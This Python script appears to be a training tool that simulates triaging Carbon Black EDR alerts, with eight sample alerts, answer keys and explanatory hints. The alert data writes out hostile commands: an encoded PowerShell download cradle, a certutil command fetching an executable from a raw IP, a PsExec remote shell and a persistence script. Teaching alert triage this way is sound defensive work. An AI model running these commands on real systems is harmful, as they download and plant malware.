"""
EDR Alert Triage Tool
======================
Simulates the alert review workflow inside an EDR platform like VMware Carbon Black.

What is Carbon Black?
  Carbon Black (now VMware Carbon Black) is an Endpoint Detection & Response (EDR)
  platform. Companies install a lightweight "sensor" (agent) on every laptop, desktop,
  and server. That sensor watches everything happening on the device in real time:
  which processes are running, what files they touch, what network connections they
  make, and whether they behave suspiciously.

What is "deployment"?
  Deployment = rolling out the Carbon Black sensor to all company devices.
  This is one of the first things the security team does. Once sensors are deployed,
  the platform starts generating alerts whenever something looks off.

What does a security analyst do with those alerts?
  They TRIAGE them — review each alert, decide if it's a real threat or a false
  positive, and take action. That's exactly what this tool simulates.

Usage:
    python triage.py

Output:
    triage_report.json  — full record of your decisions
    (summary printed to terminal at the end)
"""

import json
import random
import os
from datetime import datetime, timedelta

# ── Seed for reproducible alerts ─────────────────────────────────────────────
random.seed(99)

# ── ANSI colours (makes terminal output readable) ─────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[91m"
    YELLOW  = "\033[93m"
    GREEN   = "\033[92m"
    CYAN    = "\033[96m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    DIM     = "\033[2m"

def clr(text, color): return f"{color}{text}{C.RESET}"
def bold(text):        return f"{C.BOLD}{text}{C.RESET}"


# ── Alert dataset ─────────────────────────────────────────────────────────────
#
# In real Carbon Black, alerts look exactly like this — a process, the host it
# ran on, what it did, and a severity score. Carbon Black calls these "watchlist hits"
# or "CB Analytics" alerts depending on the detection type.

ALERTS = [
    {
        "id": "CB-001",
        "timestamp": "2025-05-20 08:14:32",
        "host": "LAPTOP-FIN-042",
        "user": "j.hernandez",
        "department": "Finance",
        "process": "powershell.exe",
        "parent_process": "excel.exe",
        "command_line": 'powershell.exe -enc "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsd2FyZS5leGFtcGxlLmNvbS9wYXlsb2FkJyk="',
        "severity": "CRITICAL",
        "alert_type": "Suspicious PowerShell",
        "cb_policy": "Standard Workstation Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": "malware.example.com:80",
        "files_modified": [],
        "ioc": "Base64-encoded PowerShell downloading from external URL",
        "hint": (
            " Carbon Black tip: PowerShell spawned BY Excel is a classic malware trick.\n"
            "   Attackers hide code in Excel macros that launch PowerShell to download payloads.\n"
            "   The '-enc' flag means the command is Base64-encoded — often used to hide malicious intent.\n"
            "   Carbon Black's sensor caught this because its POLICY flagged:\n"
            "   'Alert if Office app spawns scripting engine'\n"
            "   → This is what 'policy application' means in deployment."
        ),
        "answer": "malicious",
    },
    {
        "id": "CB-002",
        "timestamp": "2025-05-20 09:02:17",
        "host": "DESKTOP-IT-007",
        "user": "m.chen",
        "department": "IT",
        "process": "psexec.exe",
        "parent_process": "cmd.exe",
        "command_line": "psexec.exe \\\\FILESERVER01 -u admin -p ***** cmd.exe",
        "severity": "HIGH",
        "alert_type": "Lateral Movement Tool",
        "cb_policy": "IT Admin Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": "FILESERVER01:445",
        "files_modified": [],
        "ioc": "PsExec used for remote execution — common in both admin tasks and ransomware",
        "hint": (
            " Carbon Black tip: PsExec is a legitimate sysadmin tool — BUT it's also\n"
            "   heavily used by ransomware gangs to move laterally through a network.\n"
            "   Carbon Black flags it either way (that's the POLICY at work).\n"
            "   Key question: is this IT staff doing their normal job, or an attacker?\n"
            "   Note the user (m.chen) is in IT and the target is a file server.\n"
            "   This is why triage exists — not every alert is an incident."
        ),
        "answer": "benign",
    },
    {
        "id": "CB-003",
        "timestamp": "2025-05-20 09:45:55",
        "host": "LAPTOP-HR-019",
        "user": "t.washington",
        "department": "HR",
        "process": "cmd.exe",
        "parent_process": "chrome.exe",
        "command_line": "cmd.exe /c whoami && net user && ipconfig /all",
        "severity": "HIGH",
        "alert_type": "Reconnaissance Commands",
        "cb_policy": "Standard Workstation Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": None,
        "files_modified": ["C:\\Users\\t.washington\\AppData\\Local\\Temp\\out.txt"],
        "ioc": "Browser spawning cmd.exe running enumeration commands — drive-by download pattern",
        "hint": (
            " Carbon Black tip: Chrome should NEVER spawn cmd.exe.\n"
            "   When a browser launches a command prompt, it usually means a malicious\n"
            "   website triggered a drive-by download exploit.\n"
            "   'whoami', 'net user', 'ipconfig' are RECONNAISSANCE commands —\n"
            "   an attacker mapping out the system before doing damage.\n"
            "   HR staff have no reason to run these manually."
        ),
        "answer": "malicious",
    },
    {
        "id": "CB-004",
        "timestamp": "2025-05-20 10:30:01",
        "host": "LAPTOP-ENG-088",
        "user": "a.patel",
        "department": "Engineering",
        "process": "python.exe",
        "parent_process": "vscode.exe",
        "command_line": "python.exe manage.py runserver 0.0.0.0:8000",
        "severity": "MEDIUM",
        "alert_type": "Outbound Port Binding",
        "cb_policy": "Developer Workstation Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": "0.0.0.0:8000",
        "files_modified": [],
        "ioc": "Process binding to all interfaces (0.0.0.0) on non-standard port",
        "hint": (
            " Carbon Black tip: Binding to 0.0.0.0 means 'listen on ALL network interfaces'.\n"
            "   This CAN be suspicious — malware sometimes does this to open a backdoor.\n"
            "   BUT: this is a developer running a Django web server from VS Code.\n"
            "   Carbon Black's policy for the 'Developer Workstation Policy' is LESS strict\n"
            "   than the standard policy — that's the point of having multiple policies.\n"
            "   This is a false positive. Developers do this constantly."
        ),
        "answer": "benign",
    },
    {
        "id": "CB-005",
        "timestamp": "2025-05-20 11:15:44",
        "host": "SERVER-DC-001",
        "user": "SYSTEM",
        "department": "Infrastructure",
        "process": "lsass.exe",
        "parent_process": "wininit.exe",
        "command_line": "C:\\Windows\\System32\\lsass.exe",
        "severity": "CRITICAL",
        "alert_type": "Credential Dumping Attempt",
        "cb_policy": "Domain Controller Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": None,
        "files_modified": ["C:\\Windows\\Temp\\~tmp4821.dmp"],
        "ioc": "lsass.exe memory read by unknown process — Mimikatz-style credential theft",
        "hint": (
            " Carbon Black tip: lsass.exe holds ALL logged-in user credentials in memory.\n"
            "   Attackers use tools like Mimikatz to read lsass memory and steal passwords.\n"
            "   A domain controller (SERVER-DC-001) is the most valuable target in any network —\n"
            "   it controls access to everything.\n"
            "   The .dmp file written to Temp is a memory dump — classic Mimikatz behavior.\n"
            "   Carbon Black's 'Domain Controller Policy' is the strictest policy tier."
        ),
        "answer": "malicious",
    },
    {
        "id": "CB-006",
        "timestamp": "2025-05-20 12:00:10",
        "host": "LAPTOP-MKT-033",
        "user": "s.okonkwo",
        "department": "Marketing",
        "process": "teams.exe",
        "parent_process": "explorer.exe",
        "command_line": "C:\\Users\\s.okonkwo\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
        "severity": "LOW",
        "alert_type": "Unsigned Application Launch",
        "cb_policy": "Standard Workstation Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": "teams.microsoft.com:443",
        "files_modified": [],
        "ioc": "Application launched from user AppData — not installed system-wide",
        "hint": (
            "💡 Carbon Black tip: Microsoft Teams installs itself in AppData (per-user install)\n"
            "   rather than Program Files. Carbon Black flags this because malware ALSO\n"
            "   likes to hide in AppData to avoid needing admin rights.\n"
            "   But look at the network connection: teams.microsoft.com:443 — that's Microsoft.\n"
            "   And the process name, path, and parent (explorer.exe = user double-clicked it)\n"
            "   all check out. Classic false positive from an overly broad policy rule."
        ),
        "answer": "benign",
    },
    {
        "id": "CB-007",
        "timestamp": "2025-05-20 13:22:09",
        "host": "LAPTOP-FIN-017",
        "user": "r.kim",
        "department": "Finance",
        "process": "certutil.exe",
        "parent_process": "cmd.exe",
        "command_line": "certutil.exe -urlcache -split -f http://185.220.101.47/payload.exe C:\\Windows\\Temp\\svchost32.exe",
        "severity": "CRITICAL",
        "alert_type": "Living-off-the-Land Technique",
        "cb_policy": "Standard Workstation Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": "185.220.101.47:80",
        "files_modified": ["C:\\Windows\\Temp\\svchost32.exe"],
        "ioc": "certutil abused to download executable from IP address; named to mimic svchost.exe",
        "hint": (
            " Carbon Black tip: certutil.exe is a legitimate Windows certificate tool.\n"
            "   Attackers abuse it to download files because it bypasses some security tools\n"
            "   — this is called a 'Living off the Land' (LotL) technique.\n"
            "   Red flags here:\n"
            "     1. Downloading from a raw IP address (not a domain)\n"
            "     2. Saving as 'svchost32.exe' — mimicking the legit Windows process svchost.exe\n"
            "     3. Writing to C:\\Windows\\Temp\n"
            "   This is almost certainly a malware dropper."
        ),
        "answer": "malicious",
    },
    {
        "id": "CB-008",
        "timestamp": "2025-05-20 14:05:33",
        "host": "LAPTOP-OPS-055",
        "user": "d.nguyen",
        "department": "Operations",
        "process": "wscript.exe",
        "parent_process": "outlook.exe",
        "command_line": "wscript.exe C:\\Users\\d.nguyen\\AppData\\Local\\Temp\\invoice_april.vbs",
        "severity": "HIGH",
        "alert_type": "Email Attachment Script Execution",
        "cb_policy": "Standard Workstation Policy",
        "cb_sensor_version": "3.9.1.2",
        "network_connection": "94.102.49.183:443",
        "files_modified": ["C:\\Users\\d.nguyen\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.vbs"],
        "ioc": "Outlook spawned VBScript; script added itself to Startup folder for persistence",
        "hint": (
            " Carbon Black tip: Outlook spawning wscript.exe means someone opened a\n"
            "   malicious email attachment (.vbs file disguised as an invoice).\n"
            "   The script then wrote itself to the STARTUP folder — that's PERSISTENCE.\n"
            "   Persistence means the malware survives a reboot.\n"
            "   The outbound connection to a raw IP seals it.\n"
            "   This is a full infection chain: phish email → script → persistence → C2 callout."
        ),
        "answer": "malicious",
    },
]


# ── Triage session ────────────────────────────────────────────────────────────

def print_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(clr("=" * 65, C.BLUE))
    print(clr(bold("    EDR ALERT TRIAGE TOOL"), C.CYAN))
    print(clr("  Simulating VMware Carbon Black analyst workflow", C.DIM))
    print(clr("=" * 65, C.BLUE))
    print()
    print("  You are a security analyst reviewing today's EDR alerts.")
    print("  For each alert, decide: benign / suspicious / malicious")
    print("  Then add a short analyst note — this is what goes in your")
    print("  incident ticket or triage log.")
    print()
    print(clr("  Press Enter to begin...", C.DIM))
    input()


def severity_color(sev):
    return {
        "CRITICAL": clr(sev, C.RED),
        "HIGH":     clr(sev, C.YELLOW),
        "MEDIUM":   clr(sev, C.BLUE),
        "LOW":      clr(sev, C.GREEN),
    }.get(sev, sev)


def print_alert(alert, index, total):
    os.system("clear" if os.name == "posix" else "cls")
    print(clr(f"  Alert {index} of {total}  ─────────────────────────────────────", C.BLUE))
    print()
    print(f"  {bold('Alert ID:')}    {alert['id']}  │  {bold('Severity:')} {severity_color(alert['severity'])}")
    print(f"  {bold('Alert Type:')}  {clr(alert['alert_type'], C.MAGENTA)}")
    print(f"  {bold('Timestamp:')}   {alert['timestamp']}")
    print()
    print(clr("  ── Endpoint ──────────────────────────────────────────────", C.DIM))
    print(f"  {bold('Host:')}        {alert['host']}")
    print(f"  {bold('User:')}        {alert['user']}  ({alert['department']})")
    print(f"  {bold('CB Policy:')}   {alert['cb_policy']}")
    print(f"  {bold('Sensor:')}      v{alert['cb_sensor_version']}")
    print()
    print(clr("  ── Process Activity ──────────────────────────────────────", C.DIM))
    print(f"  {bold('Process:')}     {clr(alert['process'], C.YELLOW)}")
    print(f"  {bold('Parent:')}      {alert['parent_process']}")
    print(f"  {bold('Command:')}     {clr(alert['command_line'][:80], C.CYAN)}")
    if len(alert["command_line"]) > 80:
        print(f"               {clr(alert['command_line'][80:], C.CYAN)}")
    print()
    if alert["network_connection"]:
        print(f"  {bold('Network:')}     {clr(alert['network_connection'], C.RED)}")
    if alert["files_modified"]:
        for f in alert["files_modified"]:
            print(f"  {bold('File write:')}  {clr(f, C.YELLOW)}")
    print()
    print(clr("  ── Carbon Black IOC ──────────────────────────────────────", C.DIM))
    print(f"  {alert['ioc']}")
    print()


def get_verdict():
    options = {"b": "benign", "s": "suspicious", "m": "malicious"}
    while True:
        raw = input(f"  Verdict? {bold('[b]')}enign / {bold('[s]')}uspicious / {bold('[m]')}alicious : ").strip().lower()
        if raw in options:
            return options[raw]
        if raw in options.values():
            return raw
        print(clr("  Please enter b, s, or m", C.RED))


def get_note():
    note = input(f"  Analyst note (what did you see?): ").strip()
    return note if note else "No note provided."


def show_hint(alert, verdict):
    correct = alert["answer"]
    if verdict == correct:
        print()
        print(clr(f"   Correct! This alert is {correct.upper()}.", C.GREEN))
    elif verdict == "suspicious" and correct in ("malicious", "benign"):
        print()
        print(clr(f"   Partially right — this one is actually {correct.upper()}.", C.YELLOW))
        print(clr("     'Suspicious' is a valid escalation step, but try to commit!", C.DIM))
    else:
        print()
        print(clr(f"   Not quite — this alert is {correct.upper()}.", C.RED))
    print()
    print(alert["hint"])
    print()
    input(clr("  Press Enter for next alert...", C.DIM))


def print_summary(results):
    os.system("clear" if os.name == "posix" else "cls")
    print(clr("=" * 65, C.BLUE))
    print(clr(bold("  TRIAGE SESSION COMPLETE"), C.CYAN))
    print(clr("=" * 65, C.BLUE))
    print()

    correct   = sum(1 for r in results if r["verdict"] == r["correct_answer"])
    total     = len(results)
    score_pct = round(correct / total * 100)

    score_color = C.GREEN if score_pct >= 70 else (C.YELLOW if score_pct >= 50 else C.RED)
    print(f"  Score: {clr(bold(f'{correct}/{total} ({score_pct}%)'), score_color)}")
    print()

    print(clr("  ── Alert breakdown ───────────────────────────────────────", C.DIM))
    for r in results:
        icon = "Correct" if r["verdict"] == r["correct_answer"] else "❌"
        verdict_clr = C.GREEN if r["verdict"] == "benign" else (C.RED if r["verdict"] == "malicious" else C.YELLOW)
        print(f"  {icon}  {r['id']}  {r['alert_type']:<35} → {clr(r['verdict'].upper(), verdict_clr)}")
    print()

    # Count verdicts
    malicious_found = sum(1 for r in results if r["verdict"] == "malicious")
    benign_found    = sum(1 for r in results if r["verdict"] == "benign")

    print(clr("  ── Your triage summary ───────────────────────────────────", C.DIM))
    print(f"  Malicious flagged : {clr(str(malicious_found), C.RED)}")
    print(f"  Benign cleared    : {clr(str(benign_found), C.GREEN)}")
    print()

    print(clr("  ── What you learned ──────────────────────────────────────", C.DIM))
    print("  Carbon Black deployment means installing sensors on every device.")
    print("  Carbon Black policies define WHAT to alert on (e.g. Office → PowerShell).")
    print("  Analysts triage alerts: decide real threat vs false positive.")
    print("  Not every alert is malicious — context is everything.")
    print()

    # Save report
    report = {
        "session_date":  datetime.now().isoformat(),
        "score":         f"{correct}/{total}",
        "score_pct":     score_pct,
        "results":       results,
    }
    with open("triage_report.json", "w") as f:
        json.dump(report, f, indent=2)

    print(clr("   Full report saved to triage_report.json", C.GREEN))
    print()


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    random.shuffle(ALERTS)   # different order each run
    print_banner()

    results = []
    for i, alert in enumerate(ALERTS, 1):
        print_alert(alert, i, len(ALERTS))
        verdict = get_verdict()
        note    = get_note()
        show_hint(alert, verdict)

        results.append({
            "id":             alert["id"],
            "alert_type":     alert["alert_type"],
            "host":           alert["host"],
            "verdict":        verdict,
            "correct_answer": alert["answer"],
            "analyst_note":   note,
            "timestamp":      alert["timestamp"],
        })

    print_summary(results)


if __name__ == "__main__":
    main()
